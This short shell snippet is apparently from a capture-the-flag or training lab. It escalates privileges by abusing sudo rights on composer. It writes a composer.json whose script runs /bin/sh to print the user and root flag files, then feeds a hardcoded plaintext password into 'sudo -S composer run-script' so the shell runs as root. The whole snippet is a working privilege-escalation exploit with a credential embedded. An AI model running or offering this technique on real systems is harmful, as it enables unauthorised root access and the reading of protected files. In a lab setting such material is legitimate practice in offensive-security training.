TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -c \"cat /home/cry0l1t3/user.txt && cat /root/root.txt\" 0<&3 1>&3 2>&3"}}' >$TF/composer.json
echo "mrb3n_Ac@d3my!" | sudo -S composer --working-dir=$TF run-script x 2>/dev/null
